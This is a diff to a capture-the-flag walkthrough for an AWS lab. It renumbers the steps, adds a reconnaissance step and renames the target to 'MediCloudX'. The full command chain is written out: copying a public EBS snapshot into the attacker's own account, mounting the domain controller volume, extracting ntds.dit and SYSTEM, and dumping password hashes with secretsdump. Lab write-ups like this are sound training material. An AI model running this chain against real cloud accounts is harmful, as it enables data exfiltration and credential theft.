@@ -12,9 +12,19 @@ This document provides a complete step-by-step walkthrough for solving the Cloud
 
 ## Step-by-Step Solution
 
-### Step 1: Verify Your Personal AWS Account
+### Step 1: Initial Reconnaissance with carlos.cardenas
 
-First, confirm you're using your personal AWS account:
+First, use the provided CTF credentials to enumerate available snapshots:
+
+```bash
+aws ec2 describe-snapshots --profile carlos --owner-ids self
+```
+
+This will show you what snapshots are available in the CTF environment that you have access to.
+
+### Step 2: Verify Your Personal AWS Account
+
+Next, confirm you're using your personal AWS account:
 
 ```bash
 aws sts get-caller-identity --profile spartandev
@@ -29,9 +39,9 @@ aws sts get-caller-identity --profile spartandev
 }
 ```
 
-### Step 2: Discover the Public Snapshot
+### Step 3: Discover the Public Snapshot
 
-The CTF infrastructure automatically makes the Domain Controller snapshot public. Verify you can access it:
+The MediCloudX infrastructure has a publicly accessible snapshot. Verify you can access it:
 
 ```bash
 aws ec2 describe-snapshots --profile spartandev \
@@ -53,7 +63,7 @@ aws ec2 describe-snapshots --profile spartandev \
             "StartTime": "2025-09-14T01:21:56.721000+00:00",
             "Progress": "100%",
             "OwnerId": "908519937000",
-            "Description": "EkoCloudSecDC snapshot for CTF Challenge 04 - Contains NTDS database",
+            "Description": "MediCloudX backup snapshot - Weekly automated backup",
             "VolumeSize": 50,
             "Encrypted": false
         }
@@ -63,11 +73,11 @@ aws ec2 describe-snapshots --profile spartandev \
 
 **Key Observations:**
 - Snapshot is `completed` and ready for use
-- Contains 50GB of data from the Domain Controller
-- **Not encrypted** (intentional vulnerability)
-- Description confirms it contains NTDS database
+- Contains 50GB of data from a server
+- **Not encrypted** (security misconfiguration)
+- Description indicates it's a routine backup
 
-### Step 3: Copy the Public Snapshot
+### Step 4: Copy the Public Snapshot
 
 Since the snapshot is public, you can copy it directly to your account:
 
@@ -75,7 +85,7 @@ Since the snapshot is public, you can copy it directly to your account:
 aws ec2 copy-snapshot --profile spartandev \
   --source-region us-east-1 \
   --source-snapshot-id snap-039e02401f1f2c86e \
-  --description "Copied EkoCloudSecDC snapshot for analysis"
+  --description "Copied Emedicloudx.localDC snapshot for analysis"
 ```
 
 **Expected Output:**
@@ -92,7 +102,7 @@ aws ec2 describe-snapshots --profile spartandev \
   --query 'Snapshots[0].[SnapshotId,State,Progress]'
 ```
 
-### Step 4: Create Volume from Copied Snapshot
+### Step 5: Create Volume from Copied Snapshot
 
 Once the copied snapshot is complete, create an EBS volume:
 
@@ -127,7 +137,7 @@ aws ec2 create-volume --profile spartandev \
 }
 ```
 
-### Step 5: Attach Volume to Analysis Instance
+### Step 6: Attach Volume to Analysis Instance
 
 Attach the volume to your Kali Linux analysis instance:
 
@@ -149,7 +159,7 @@ aws ec2 attach-volume --profile spartandev \
 }
 ```
 
-### Step 6: SSH to Analysis Instance
+### Step 7: SSH to Analysis Instance
 
 Connect to your Kali Linux instance:
 
@@ -157,7 +167,7 @@ Connect to your Kali Linux instance:
 ssh -i CursoHackingJunior.pem kali@34.203.221.110
 ```
 
-### Step 7: Prepare the Environment
+### Step 8: Prepare the Environment
 
 Install necessary tools and create mount point:
 
@@ -187,7 +197,7 @@ sudo apt install -y ntfs-3g
 sudo apt install python3-impacket
 ```
 
-### Step 8: Mount the Windows Volume
+### Step 9: Mount the Windows Volume
 
 Mount the NTFS volume in read-only mode:
 
@@ -202,7 +212,7 @@ ls -la /mnt/dc-snapshot/
 
 You should see typical Windows directories: `Windows/`, `Program Files/`, `Users/`, etc.
 
-### Step 9: Extract Critical Files
+### Step 10: Extract Critical Files
 
 Copy the NTDS database and SYSTEM registry hive:
 
@@ -220,7 +230,7 @@ sudo chown $USER:$USER ~/ntds.dit ~/SYSTEM
 ls -la ~/ntds.dit ~/SYSTEM
 ```
 
-### Step 10: Extract Password Hashes
+### Step 11: Extract Password Hashes
 
 Use Impacket's secretsdump to extract all password hashes:
 
@@ -242,7 +252,7 @@ Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 EC2AMAZ-9GMMSQ6$:1000:aad3b435b51404eeaad3b435b51404ee:713338155fec84a6dc24f383f11ace55:::
 ```
 
-### Step 11: Find the Target User Hash
+### Step 12: Find the Target User Hash
 
 Search for the `svc-flag` user in the extracted hashes:
 
@@ -255,7 +265,7 @@ grep "svc-flag" secrets.ntds
 svc-flag:1001:aad3b435b51404eeaad3b435b51404ee:8846F7EAEE8FB117AD06BDD830B7586C:::
 ```
 
-### Step 12: Extract the Flag
+### Step 13: Extract the Flag
 
 The flag is the NT hash portion (after the third colon):
 
@@ -263,13 +273,14 @@ The flag is the NT hash portion (after the third colon):
 
 ## Attack Flow Summary
 
-1. **Reconnaissance**: Identified public EBS snapshot containing DC data
-2. **Cross-Account Access**: Exploited public snapshot permissions
-3. **Data Exfiltration**: Copied snapshot to personal AWS account
-4. **Volume Analysis**: Created volume and attached to analysis instance
-5. **File System Access**: Mounted NTFS volume and extracted critical files
-6. **Credential Extraction**: Used secretsdump to extract NTDS hashes
-7. **Target Identification**: Located svc-flag user NT hash
+1. **Initial Reconnaissance**: Used carlos.cardenas credentials to enumerate snapshots
+2. **Target Discovery**: Identified public EBS snapshot from MediCloudX
+3. **Cross-Account Access**: Exploited public snapshot permissions
+4. **Data Exfiltration**: Copied snapshot to personal AWS account
+5. **Volume Analysis**: Created volume and attached to analysis instance
+6. **File System Access**: Mounted NTFS volume and extracted critical files
+7. **Credential Extraction**: Used secretsdump to extract NTDS hashes
+8. **Target Identification**: Located svc-flag user NT hash
 
 ## Key Vulnerabilities Exploited
 
